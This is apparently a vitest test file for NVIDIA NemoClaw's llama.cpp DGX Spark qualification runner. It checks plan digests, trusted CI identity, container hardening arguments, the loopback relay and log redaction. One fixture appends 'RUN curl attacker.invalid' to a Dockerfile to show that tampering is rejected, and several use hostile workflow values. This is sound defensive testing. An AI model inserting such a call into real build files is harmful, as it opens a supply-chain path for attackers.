// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import { createHash } from "node:crypto";
import fs from "node:fs";
import net from "node:net";
import * as childProcess from "node:child_process";
import os from "node:os";
import path from "node:path";

import { describe, expect, it, vi } from "vitest";

import { loadLlamaCppImageConfig } from "../../../scripts/checks/export-llama-cpp-image-config.mts";
import {
  buildCandidateImageArgv,
  buildRuntimeLogForbiddenValues,
  buildServerContainerArgv,
  expectedRegistryName,
  expectedRegistryOwner,
  hashModelFile,
  resolveRequestGuardAddress,
  startQualificationLoopbackRelay,
  parseNvidiaSmi,
  parseQualificationInvocation,
  type QualificationInvocation,
  type QualificationPlan,
  qualifyDockerLoopbackPublishAuthority,
  sha256Text,
  validateCandidateDockerfile,
  validateChatCompletionResponse,
  validateModelsResponse,
  validateOpenClawQualificationImageLabels,
  validateQualificationPlan,
  validateRuntimeLogRedaction,
  validateStartupLog,
} from "../../../scripts/checks/run-llama-cpp-dgx-spark-qualification.mts";
import {
  consumeDockerLoopbackPublishAuthority,
  type DockerLoopbackPublishAuthority,
} from "../../../src/lib/inference/llama-cpp/host-local-runtime";

vi.mock("node:child_process", async (importOriginal) => ({
  ...(await importOriginal<typeof import("node:child_process")>()),
}));

const BASE_SHA = "b".repeat(40);
const HEAD_SHA = "a".repeat(40);
const WORKFLOW_SHA = "c".repeat(40);
const RUN_ID = "42";
const RUN_ATTEMPT = "2";
const MODEL_PATH = "/var/lib/nemoclaw/models/Nemotron-3-Nano-30B-A3B-UD-Q4_K_XL.gguf";
const EXPECTED_MODEL = "nvidia-nemotron-3-nano-30b-a3b";
const repoRoot = path.resolve(import.meta.dirname, "../../..");
const trustedImageRoot = path.join(repoRoot, "managed-inference", "images", "llama-cpp");

const config = loadLlamaCppImageConfig();
const planSource = config.publication_qualification_plan;
const planDigest = config.publication_qualification_plan_sha256;
const plan = validateQualificationPlan(planSource, planDigest);

function trustedEnvironment(overrides: Record<string, string | undefined> = {}) {
  return {
    GITHUB_ACTOR: "trusted-maintainer",
    GITHUB_ACTOR_ID: "41898282",
    GITHUB_EVENT_NAME: "workflow_dispatch",
    GITHUB_REF: "refs/heads/main",
    GITHUB_REPOSITORY: "NVIDIA/NemoClaw",
    GITHUB_RUN_ATTEMPT: RUN_ATTEMPT,
    GITHUB_RUN_ID: RUN_ID,
    GITHUB_SHA: WORKFLOW_SHA,
    GITHUB_WORKFLOW_REF: "NVIDIA/NemoClaw/.github/workflows/e2e.yaml@refs/heads/main",
    ...overrides,
  };
}

function invocationArguments() {
  return [
    "--base-sha",
    BASE_SHA,
    "--candidate-root",
    "/work/candidate",
    "--head-sha",
    HEAD_SHA,
    "--model-host-path",
    MODEL_PATH,
    "--output",
    "/work/artifacts/evidence.json",
    "--plan",
    "/work/tmp/plan.json",
    "--plan-sha256",
    planDigest,
    "--registry-name",
    expectedRegistryName(RUN_ID, RUN_ATTEMPT),
    "--run-attempt",
    RUN_ATTEMPT,
    "--run-id",
    RUN_ID,
    "--workflow-sha",
    WORKFLOW_SHA,
  ];
}

function parsedInvocation(): QualificationInvocation {
  const invocation = parseQualificationInvocation(invocationArguments(), trustedEnvironment());
  expect(invocation).toMatchObject({ cleanupOnly: false });
  return invocation as QualificationInvocation;
}

function mutatedPlan(mutate: (value: Record<string, any>) => void): [string, string] {
  const value = JSON.parse(planSource) as Record<string, any>;
  mutate(value);
  const source = JSON.stringify(value);
  return [source, sha256Text(source)];
}

function valuesAfter(argv: string[], option: string): string[] {
  return argv.flatMap((value, index) => (argv[index - 1] === option ? [value] : []));
}

function qualificationPlanForModel(content: Buffer): QualificationPlan {
  return {
    ...plan,
    recipe: {
      ...plan.recipe,
      model: {
        ...plan.recipe.model,
        file: {
          ...plan.recipe.model.file,
          digest: `sha256:${createHash("sha256").update(content).digest("hex")}`,
          sizeBytes: content.length,
        },
      },
    },
  } as unknown as QualificationPlan;
}

describe("trusted llama.cpp DGX Spark qualification runner", () => {
  it("requires a patched live Docker server before loopback publication (#8260)", () => {
    ["27.5.1", "28.0.0", "28.3.2", "28.3.3-rc.1", "", "client 29.0.0"].forEach((version) => {
      expect(() => qualifyDockerLoopbackPublishAuthority(version)).toThrow(
        /Docker Engine 28\.3\.3 or newer/u,
      );
    });
    expect(qualifyDockerLoopbackPublishAuthority("28.3.3\n").serverVersion).toBe("28.3.3");
    expect(qualifyDockerLoopbackPublishAuthority("28.3.3+ubuntu.1").serverVersion).toBe(
      "28.3.3+ubuntu.1",
    );
    expect(qualifyDockerLoopbackPublishAuthority("29.0.0").serverVersion).toBe("29.0.0");

    const singleUseAuthority = qualifyDockerLoopbackPublishAuthority("28.3.3");
    (
      [
        Object.create(singleUseAuthority),
        Object.assign({}, singleUseAuthority),
      ] as DockerLoopbackPublishAuthority[]
    ).forEach((clonedAuthority) => {
      expect(() => consumeDockerLoopbackPublishAuthority(clonedAuthority)).toThrow(
        /authority is invalid/u,
      );
    });
    expect(() => consumeDockerLoopbackPublishAuthority(singleUseAuthority)).not.toThrow();
    expect(() => consumeDockerLoopbackPublishAuthority(singleUseAuthority)).toThrow(
      /already consumed/u,
    );
    expect(() =>
      consumeDockerLoopbackPublishAuthority({
        serverVersion: "29.0.0",
      } as DockerLoopbackPublishAuthority),
    ).toThrow(/authority is invalid/u);
  });

  it.each(
    Array.from(
      [
        (value: Record<string, any>) => {
          value.untrusted = true;
        },
        (value: Record<string, any>) => {
          value.imageBuild.platform.platform = "linux/amd64";
        },
        (value: Record<string, any>) => {
          value.imageBuild.cuda.runtimeBase = "docker.io/nvidia/cuda:latest";
        },
        (value: Record<string, any>) => {
          value.recipe.runtime.gpu.cpuFallback = "allow";
        },
        (value: Record<string, any>) => {
          value.recipe.surfaces.ui = "enabled";
        },
      ],
      (value) => [value],
    ),
  )(
    "accepts only the canonical digest-bound declarative execution plan [case %#] (#8260)",
    (mutate) => {
      expect(plan.contractVersion).toBe(1);
      expect(plan.recipe.id).toBe("llama-cpp.nemotron-3-nano-30b-a3b.spark-single.v1");
      expect(() => validateQualificationPlan(planSource, `sha256:${"0".repeat(64)}`)).toThrow(
        /digest mismatch/u,
      );

      const spaced = `${planSource}\n`;
      expect(() => validateQualificationPlan(spaced, sha256Text(spaced))).toThrow(/canonical/u);

      const [source, digest] = mutatedPlan(mutate);
      expect(() => validateQualificationPlan(source, digest)).toThrow();
    },
  );

  it("binds normal and cleanup invocations to the trusted workflow run (#8260)", () => {
    expect(parsedInvocation()).toEqual({
      candidateBase: BASE_SHA,
      candidateHead: HEAD_SHA,
      candidateRoot: "/work/candidate",
      cleanupOnly: false,
      modelHostPath: MODEL_PATH,
      output: "/work/artifacts/evidence.json",
      planFile: "/work/tmp/plan.json",
      planSha256: planDigest,
      registryName: expectedRegistryName(RUN_ID, RUN_ATTEMPT),
      registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
      runAttempt: RUN_ATTEMPT,
      runId: RUN_ID,
      workflowSha: WORKFLOW_SHA,
    });

    expect(
      parseQualificationInvocation(
        invocationArguments(),
        trustedEnvironment({
          GITHUB_ACTOR: "merge-queue[bot]",
          GITHUB_ACTOR_ID: "12345",
          GITHUB_EVENT_NAME: "push",
        }),
      ),
    ).toMatchObject({ cleanupOnly: false, workflowSha: WORKFLOW_SHA });

    expect(
      parseQualificationInvocation(
        [
          "--cleanup-only",
          "--registry-name",
          expectedRegistryName(RUN_ID, RUN_ATTEMPT),
          "--run-attempt",
          RUN_ATTEMPT,
          "--run-id",
          RUN_ID,
        ],
        trustedEnvironment(),
      ),
    ).toEqual({
      cleanupOnly: true,
      registryName: expectedRegistryName(RUN_ID, RUN_ATTEMPT),
      registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
      runAttempt: RUN_ATTEMPT,
      runId: RUN_ID,
    });
  });

  it.each(
    Array.from(
      [
        trustedEnvironment({ GITHUB_REPOSITORY: "attacker/fork" }),
        trustedEnvironment({ GITHUB_REF: "refs/pull/1/merge" }),
        trustedEnvironment({ GITHUB_EVENT_NAME: "pull_request_target" }),
        trustedEnvironment({ GITHUB_ACTOR: "untrusted user" }),
        trustedEnvironment({ GITHUB_ACTOR_ID: "0" }),
        trustedEnvironment({ GITHUB_RUN_ATTEMPT: "3" }),
        trustedEnvironment({ GITHUB_RUN_ID: "43" }),
        trustedEnvironment({ GITHUB_SHA: HEAD_SHA }),
        trustedEnvironment({
          GITHUB_WORKFLOW_REF: "NVIDIA/NemoClaw/.github/workflows/e2e.yaml@refs/heads/feature",
        }),
      ],
      (value) => [value],
    ),
  )(
    "rejects hostile CLI fields, paths, ownership, and workflow identity [case %#] (#8260)",
    (environment) => {
      const unknown = [...invocationArguments(), "--extra", "value"];
      expect(() => parseQualificationInvocation(unknown, trustedEnvironment())).toThrow();

      const duplicate = [...invocationArguments(), "--run-id", RUN_ID];
      expect(() => parseQualificationInvocation(duplicate, trustedEnvironment())).toThrow();

      const traversal = invocationArguments();
      traversal[traversal.indexOf("--candidate-root") + 1] = "/work/../candidate";
      expect(() => parseQualificationInvocation(traversal, trustedEnvironment())).toThrow();

      const wrongRegistry = invocationArguments();
      wrongRegistry[wrongRegistry.indexOf("--registry-name") + 1] = "nemoclaw-llama-cpp-999-1";
      expect(() => parseQualificationInvocation(wrongRegistry, trustedEnvironment())).toThrow();

      expect(() => parseQualificationInvocation(invocationArguments(), environment)).toThrow();
    },
  );

  it("builds the exact ARM64 candidate plan from the trusted image context (#8260)", () => {
    const argv = buildCandidateImageArgv(plan, parsedInvocation(), "/work/tmp/metadata.json");
    expect(valuesAfter(argv, "--platform")).toEqual(["linux/arm64"]);
    expect(valuesAfter(argv, "--tag")).toEqual([
      `localhost:5000/nemoclaw-llama-cpp-dgx-spark/llama-cpp-server:${HEAD_SHA}`,
    ]);
    expect(argv).toContain("--push");
    expect(argv).not.toContain("--load");
    expect(valuesAfter(argv, "--file")).toEqual([path.join(trustedImageRoot, "Dockerfile")]);
    expect(argv.at(-1)).toBe(trustedImageRoot);
    expect(argv).not.toContain("/work/candidate");
    expect(valuesAfter(argv, "--build-arg")).toEqual(
      expect.arrayContaining([
        "CUDA_ARCHITECTURES=121a-real",
        `CUDA_DEV_IMAGE=${plan.imageBuild.cuda.developmentBase}`,
        `CUDA_RUNTIME_IMAGE=${plan.imageBuild.cuda.runtimeBase}`,
        `LLAMA_CPP_ARCHIVE_SHA256=${plan.imageBuild.source.archiveSha256}`,
        `LLAMA_CPP_REVISION=${plan.imageBuild.source.revision}`,
        `NEMOCLAW_REVISION=${HEAD_SHA}`,
        "TARGETPLATFORM=linux/arm64",
      ]),
    );
  });

  it("requires the candidate Dockerfile to byte-match trusted main (#8260)", () => {
    const candidateRoot = fs.realpathSync(
      fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-llama-cpp-candidate-")),
    );
    const candidateImageRoot = path.join(candidateRoot, "managed-inference", "images", "llama-cpp");
    fs.mkdirSync(candidateImageRoot, { recursive: true });
    fs.copyFileSync(
      path.join(trustedImageRoot, "Dockerfile"),
      path.join(candidateImageRoot, "Dockerfile"),
    );
    try {
      expect(() => validateCandidateDockerfile(candidateRoot)).not.toThrow();
      fs.appendFileSync(
        path.join(candidateImageRoot, "Dockerfile"),
        "\nRUN curl attacker.invalid\n",
      );
      expect(() => validateCandidateDockerfile(candidateRoot)).toThrow(/byte-match/u);
    } finally {
      fs.rmSync(candidateRoot, { force: true, recursive: true });
    }
  });

  it("keeps the recipe-selected request guard internal without putting the API key in Docker arguments (#8667)", () => {
    const content = Buffer.from("qualification model fixture\n", "utf8");
    const testPlan = qualificationPlanForModel(content);
    const modelRoot = fs.realpathSync(
      fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-qualification-model-")),
    );
    const modelHostPath = path.join(modelRoot, testPlan.recipe.model.file.path);
    fs.writeFileSync(modelHostPath, content);
    try {
      const model = hashModelFile(modelHostPath, testPlan);
      const modelStatus = fs.lstatSync(modelHostPath, { bigint: true });
      expect(model.filesystemIdentity).toEqual({
        ctimeNs: modelStatus.ctimeNs,
        dev: modelStatus.dev,
        ino: modelStatus.ino,
        mtimeNs: modelStatus.mtimeNs,
        size: modelStatus.size,
      });
      const imageReference = `localhost:5000/repo@sha256:${"d".repeat(64)}`;
      const containerOptions = {
        apiKeyHostPath: "/work/tmp/api-key",
        containerName: "qualified-server",
        imageReference,
        model,
        networkName: "qualified-internal",
        registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
        runtimeGid: 1001,
        runtimeUid: 1001,
      } as const;
      const argv = buildServerContainerArgv(testPlan, {
        ...containerOptions,
      });
      expect(argv).toEqual(
        expect.arrayContaining([
          "--read-only",
          "--cap-drop",
          "ALL",
          "no-new-privileges=true",
          "--gpu-layers",
          "all",
          "--ctx-size",
          String(testPlan.recipe.serve.contextSize),
          "--batch-size",
          String(testPlan.recipe.serve.batchSize),
          "--ubatch-size",
          String(testPlan.recipe.serve.microBatchSize),
          "--cache-type-k",
          testPlan.recipe.serve.kvCache.key,
          "--cache-type-v",
          testPlan.recipe.serve.kvCache.value,
          "--flash-attn",
          "on",
          "--metrics",
          "--no-ui",
          "--no-slots",
          "--no-mmproj",
          "--no-agent",
        ]),
      );
      expect(valuesAfter(argv, "--env")).toEqual(["LLAMA_ARG_LOG_VERBOSITY=4"]);
      expect(valuesAfter(argv, "--publish")).toEqual([]);
      expect(valuesAfter(argv, "--network")).toEqual(["qualified-internal"]);
      expect(valuesAfter(argv, "--entrypoint")).toEqual([
        "/usr/local/bin/nemoclaw-llama-cpp-request-guard",
      ]);
      expect(valuesAfter(argv, "--listen-port")).toEqual([String(testPlan.recipe.serve.port)]);
      expect(valuesAfter(argv, "--upstream-port")).toEqual([
        String(testPlan.recipe.serve.requestGuard.upstreamPort),
      ]);
      expect(valuesAfter(argv, "--max-request-body-bytes")).toEqual([
        String(testPlan.recipe.serve.limits.maxRequestBodyBytes),
      ]);
      expect(valuesAfter(argv, "--max-request-header-bytes")).toEqual([
        String(testPlan.recipe.serve.limits.maxRequestHeaderBytes),
      ]);
      expect(valuesAfter(argv, "--max-output-tokens")).toEqual([
        String(testPlan.recipe.serve.limits.maxOutputTokens),
      ]);
      expect(valuesAfter(argv, "--request-timeout-seconds")).toEqual([
        String(testPlan.recipe.serve.limits.requestTimeoutSeconds),
      ]);
      expect(valuesAfter(argv, "--shutdown-timeout-seconds")).toEqual([
        String(testPlan.recipe.serve.limits.shutdownTimeoutSeconds),
      ]);
      const separator = argv.indexOf("--");
      expect(argv[separator + 1]).toBe("/usr/local/bin/llama-server");
      expect(valuesAfter(argv.slice(separator), "--host")).toEqual(["127.0.0.1"]);
      expect(valuesAfter(argv.slice(separator), "--port")).toEqual([
        String(testPlan.recipe.serve.requestGuard.upstreamPort),
      ]);
      expect(valuesAfter(argv.slice(separator), "--n-predict")).toEqual([
        String(testPlan.recipe.serve.limits.maxOutputTokens),
      ]);
      const alternateContainerPort = 9_081;
      // The adapter must use its validated plan input instead of duplicating the current recipe port.
      const alternatePortPlan = {
        ...testPlan,
        recipe: {
          ...testPlan.recipe,
          serve: { ...testPlan.recipe.serve, port: alternateContainerPort },
        },
      } as unknown as QualificationPlan;
      const alternatePortArgv = buildServerContainerArgv(alternatePortPlan, {
        ...containerOptions,
      });
      expect(valuesAfter(alternatePortArgv, "--publish")).toEqual([]);
      expect(valuesAfter(alternatePortArgv, "--listen-port")).toEqual([
        String(alternateContainerPort),
      ]);
      expect(valuesAfter(alternatePortArgv, "--listen-port")).toEqual([
        String(alternateContainerPort),
      ]);
      expect(valuesAfter(argv, "--network")).toEqual(["qualified-internal"]);
      expect(valuesAfter(argv, "--user")).toEqual(["1001:1001"]);
      expect(valuesAfter(argv, "--gpus")).toEqual(["driver=nvidia,count=1"]);
      expect(valuesAfter(argv, "--cap-drop")).toEqual(["ALL"]);
      expect(valuesAfter(argv, "--security-opt")).toEqual(["no-new-privileges=true"]);
      expect(valuesAfter(argv, "--api-key-file")).toEqual(["/run/secrets/llama-cpp-api-key"]);
      expect(argv).not.toContain("--api-key");
      expect(valuesAfter(argv, "--mount")).toEqual([
        `type=bind,source=${modelHostPath},target=/models/${testPlan.recipe.model.file.path},readonly`,
        "type=bind,source=/work/tmp/api-key,target=/run/secrets/llama-cpp-api-key,readonly",
      ]);
      expect(valuesAfter(argv, "--memory")).toEqual([
        `${testPlan.recipe.runtime.resources.memoryBytes}b`,
      ]);
      expect(valuesAfter(argv, "--memory-swap")).toEqual([
        `${testPlan.recipe.runtime.resources.memoryBytes}b`,
      ]);
      expect(valuesAfter(argv, "--pids-limit")).toEqual([
        String(testPlan.recipe.runtime.resources.pidsLimit),
      ]);
      expect(valuesAfter(argv, "--tmpfs")).toEqual([
        `/tmp:rw,noexec,nosuid,nodev,size=${testPlan.recipe.runtime.resources.writableStorageBytes},uid=1001,gid=1001,mode=1777`,
      ]);
      expect(() =>
        buildServerContainerArgv(testPlan, {
          apiKeyHostPath: "/work/tmp/api-key",
          containerName: "qualified-server",
          imageReference: `localhost:5000/repo@sha256:${"d".repeat(64)}`,
          model,
          networkName: "qualified-internal",
          registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
          runtimeGid: 1001,
          runtimeUid: 0,
        }),
      ).toThrow(/runtime uid/u);
    } finally {
      fs.rmSync(modelRoot, { force: true, recursive: true });
    }
  });

  describe("request guard address inspection", () => {
    const names = {
      containerName: "qualification-container",
      networkName: "qualification-network",
      registryOwner: "qualification-owner",
    };

    function dockerInspection() {
      const fixture = {
        containerOwner: names.registryOwner,
        networkOwner: names.registryOwner,
        containerStatus: 0,
        networkStatus: 0,
        network: { Id: "internal-network-id", Internal: true },
        container: {
          State: { Running: true },
          NetworkSettings: {
            Networks: {
              [names.networkName]: { NetworkID: "internal-network-id", IPAddress: "172.29.0.7" },
            },
          },
        },
      };
      vi.spyOn(childProcess, "spawnSync").mockImplementation((command, args = []) => {
        expect(command).toBe("docker");
        const network = args[0] === "network";
        const owner = args.includes("--format");
        expect(args.at(-1)).toBe(network ? names.networkName : names.containerName);
        const stdout = owner
          ? `${network ? fixture.networkOwner : fixture.containerOwner}\n`
          : Buffer.from(JSON.stringify([network ? fixture.network : fixture.container]));
        return {
          pid: 1,
          status: owner ? (network ? fixture.networkStatus : fixture.containerStatus) : 0,
          signal: null,
          stdout,
          stderr: "",
          output: [],
        };
      });
      return fixture;
    }

    it("returns the IPv4 address of an owned running container on its internal network (#8231)", () => {
      dockerInspection();
      expect(resolveRequestGuardAddress(names)).toBe("172.29.0.7");
    });

    it.each([
      "foreign container owner",
      "foreign network owner",
      "failed container inspection",
      "failed network inspection",
      "stopped container",
      "external network",
      "additional network",
      "missing network endpoint",
      "mismatched network ID",
      "empty address",
      "hostname address",
      "IPv6 address",
    ])("rejects %s before returning a relay target (#8231)", (scenario) => {
      const fixture = dockerInspection();
      const endpoints = fixture.container.NetworkSettings.Networks;
      const endpoint = endpoints[names.networkName]!;
      switch (scenario) {
        case "foreign container owner":
          fixture.containerOwner = "foreign-owner";
          break;
        case "foreign network owner":
          fixture.networkOwner = "foreign-owner";
          break;
        case "failed container inspection":
          fixture.containerStatus = 1;
          break;
        case "failed network inspection":
          fixture.networkStatus = 1;
          break;
        case "stopped container":
          fixture.container.State.Running = false;
          break;
        case "external network":
          fixture.network.Internal = false;
          break;
        case "additional network":
          endpoints.other = { NetworkID: "other-id", IPAddress: "172.30.0.7" };
          break;
        case "missing network endpoint":
          delete endpoints[names.networkName];
          break;
        case "mismatched network ID":
          endpoint.NetworkID = "other-id";
          break;
        case "empty address":
          endpoint.IPAddress = "";
          break;
        case "hostname address":
          endpoint.IPAddress = "example.com";
          break;
        case "IPv6 address":
          endpoint.IPAddress = "fd00::7";
          break;
        default:
          throw new Error("unknown inspection scenario");
      }
      expect(() => resolveRequestGuardAddress(names)).toThrow(/qualification relay requires/u);
    });
  });

  it("forwards through localhost while synchronous qualification commands run and closes the listener (#8231)", async () => {
    // A worker-owned echo endpoint keeps both ends independent of this test's blocked event loop.
    const { Worker } = await import("node:worker_threads");
    const upstream = new Worker(
      `
      const net = require('node:net');
      const {parentPort} = require('node:worker_threads');
      const server = net.createServer(s => s.pipe(s));
      server.listen(0, '127.0.0.1', () => parentPort.postMessage(server.address().port));
    `,
      { eval: true },
    );
    let relay: Awaited<ReturnType<typeof startQualificationLoopbackRelay>> | undefined;
    try {
      const targetPort = await new Promise<number>((resolve) => upstream.once("message", resolve));
      relay = await startQualificationLoopbackRelay("127.0.0.1", targetPort, 2);
      const response = childProcess.spawnSync(
        process.execPath,
        [
          "-e",
          `
        const s = require('node:net').createConnection({host:'127.0.0.1',port:${relay.port}}, () => s.write('relay-proof'));
        s.once('data', d => { process.stdout.write(d); s.destroy(); });
        s.on('error', () => process.exit(1));
      `,
        ],
        { encoding: "utf8", timeout: 3000 },
      );
      expect(response.status).toBe(0);
      expect(response.stdout).toBe("relay-proof");
      await expect(
        startQualificationLoopbackRelay("127.0.0.1", targetPort, 2, relay.port),
      ).rejects.toThrow(/could not listen/u);
      await relay.close();
      const closed = await new Promise<boolean>((resolve) => {
        const socket = net.createConnection({ host: "127.0.0.1", port: relay!.port });
        socket.on("error", () => resolve(true));
        socket.on("connect", () => {
          socket.destroy();
          resolve(false);
        });
      });
      expect(closed).toBe(true);
    } finally {
      await relay?.close();
      await upstream.terminate();
    }
  });

  it("closes a relay connection when the request guard is unavailable (#8231)", async () => {
    const reserve = net.createServer();
    await new Promise<void>((resolve) => reserve.listen(0, "127.0.0.1", resolve));
    const targetPort = (reserve.address() as net.AddressInfo).port;
    await new Promise<void>((resolve) => reserve.close(() => resolve()));
    const relay = await startQualificationLoopbackRelay("127.0.0.1", targetPort, 1);
    try {
      await new Promise<void>((resolve, reject) => {
        const socket = net.createConnection({ host: "127.0.0.1", port: relay.port });
        socket.setTimeout(2000, () => {
          socket.destroy();
          reject(new Error("relay did not close"));
        });
        socket.on("error", () => {});
        socket.on("close", () => resolve());
      });
    } finally {
      await relay.close();
    }
  });

  it("rejects relay addresses and ports before opening a listener (#8231)", async () => {
    await expect(startQualificationLoopbackRelay("example.com", 8081, 10)).rejects.toThrow(/IPv4/u);
    await expect(startQualificationLoopbackRelay("127.0.0.1", 0, 10)).rejects.toThrow(/port/u);
    await expect(startQualificationLoopbackRelay("127.0.0.1", 8081, 0)).rejects.toThrow(/timeout/u);
  });

  it("accepts only the exact NVIDIA OpenClaw ARM64 managed-image labels", () => {
    const labels = {
      "io.nvidia.nemoclaw.agent": "openclaw",
      "io.nvidia.nemoclaw.managed-image.contract": "1",
      "io.nvidia.nemoclaw.managed-image.platform": "linux/arm64",
      "org.opencontainers.image.revision": "eb1d2f5700393892f227ac9fd56f485fc6718bce",
      "org.opencontainers.image.source": "https://github.com/NVIDIA/NemoClaw",
    };
    expect(() =>
      validateOpenClawQualificationImageLabels(
        JSON.stringify(labels),
        "eb1d2f5700393892f227ac9fd56f485fc6718bce",
      ),
    ).not.toThrow();
    expect(() =>
      validateOpenClawQualificationImageLabels(
        JSON.stringify({ ...labels, "io.nvidia.nemoclaw.agent": "hermes" }),
        "eb1d2f5700393892f227ac9fd56f485fc6718bce",
      ),
    ).toThrow(/declarative identity/u);
    expect(() =>
      validateOpenClawQualificationImageLabels(JSON.stringify(labels), "f".repeat(40)),
    ).toThrow(/declarative identity/u);
    expect(() => validateOpenClawQualificationImageLabels("{", "f".repeat(40))).toThrow(
      /labels are invalid/u,
    );
  });

  it.each([
    "llama_model_loader: offloaded 56/57 layers to GPU",
    "warning: no usable GPU found, --gpu-layers option will be ignored",
    "CPU fallback enabled\noffloaded 57/57 layers to GPU",
    "server is listening",
    "offloaded 57/57 layers to GPU\noffloaded 58/58 layers to GPU",
  ])(
    "requires unambiguous full GPU offload and rejects CPU fallback warnings [%s] (#8260)",
    (log) => {
      expect(validateStartupLog("llama_model_loader: offloaded 57/57 layers to GPU\n")).toEqual({
        offloadedLayers: 57,
        totalLayers: 57,
      });

      expect(() => validateStartupLog(log)).toThrow();
    },
  );

  it("rejects every runner-derived credential, model path, prompt, and response in bounded runtime logs (#8144)", () => {
    const apiKey = "a".repeat(64);
    const authorization = `Bearer ${apiKey}`;
    const forbidden = buildRuntimeLogForbiddenValues(
      plan,
      parsedInvocation(),
      apiKey,
      authorization,
    );
    expect(forbidden).toEqual(
      expect.arrayContaining([
        `${authorization.slice(0, -1)}0`,
        MODEL_PATH,
        `/models/${plan.recipe.model.file.path}`,
        "This request must be rejected.",
        "Return one short readiness token.",
        "Reply with exactly: ready",
        "Reply with one token.",
        "Count upward without stopping.",
        "Report the requested qualification status.",
        "Use the available tool to get the weather in Seattle.",
        '{"conditions":"clear","temperature_c":21}',
        '{"location":"Seattle"}',
        plan.qualification.agentQualification.prompts.normal,
        plan.qualification.agentQualification.prompts.tool,
        plan.qualification.agentQualification.prompts.continuation,
        plan.qualification.agentQualification.fixture.value,
      ]),
    );
    expect(validateRuntimeLogRedaction("server request complete\n", forbidden)).toEqual({
      ok: true,
    });
    forbidden.forEach((value) => {
      expect(() => validateRuntimeLogRedaction(`server log: ${value}\n`, forbidden)).toThrow(
        /credential, path, prompt, or response/u,
      );
    });
  });

  it.each([
    "NVIDIA GB10, 580.65.05",
    "NVIDIA H100 80GB HBM3, 580.65.06",
    "NVIDIA GB10, 580.65.06\nNVIDIA GB10, 580.65.06",
  ])(
    "accepts only one NVIDIA GB10 at or above the declarative driver floor [%s] (#8260)",
    (output) => {
      expect(parseNvidiaSmi("NVIDIA GB10, 580.65.06\n", "580.65.06")).toEqual({
        count: 1,
        driverVersion: "580.65.06",
        name: "NVIDIA GB10",
      });

      expect(() => parseNvidiaSmi(output, "580.65.06")).toThrow();
    },
  );

  it("validates exact served-model and authenticated completion response shapes (#8260)", () => {
    expect(() =>
      validateModelsResponse({ data: [{ id: EXPECTED_MODEL }], object: "list" }, EXPECTED_MODEL),
    ).not.toThrow();
    expect(() =>
      validateModelsResponse(
        {
          data: [{ id: EXPECTED_MODEL }, { id: "unexpected" }],
          object: "list",
        },
        EXPECTED_MODEL,
      ),
    ).toThrow();

    expect(() =>
      validateChatCompletionResponse(
        {
          choices: [{ message: { content: "ready", role: "assistant" } }],
          model: EXPECTED_MODEL,
          object: "chat.completion",
        },
        EXPECTED_MODEL,
      ),
    ).not.toThrow();
    expect(() =>
      validateChatCompletionResponse(
        {
          choices: [{ message: { content: "ready", role: "assistant" } }],
          model: "unexpected",
          object: "chat.completion",
        },
        EXPECTED_MODEL,
      ),
    ).toThrow();
  });
});
